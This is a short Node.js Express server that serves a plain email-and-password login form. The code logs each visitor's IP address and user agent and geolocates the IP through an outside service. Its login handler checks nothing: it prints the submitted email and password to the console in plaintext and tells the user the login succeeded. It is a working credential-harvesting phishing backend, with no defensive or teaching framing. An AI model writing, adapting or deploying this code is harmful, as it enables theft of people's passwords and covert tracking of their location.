const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];

    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
        const location = response.data;
        console.log(`IP Address: ${ip}`);
        console.log(`User Agent: ${userAgent}`);
        console.log(`Location: ${location.city}, ${location.region_code}, ${location.country_name}`);
    } catch (error) {
        console.error('Error fetching location:', error);
    }

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login</title>
        </head>
        <body>
            <form action="/login" method="post">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" required><br>
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required><br>
                <input type="submit" value="Login">
            </form>
        </body>
        </html>
    `);
});

app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;
    console.log(`Email: ${email}`);
    console.log(`Password: ${password}`);
    res.send('Login successful!');
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
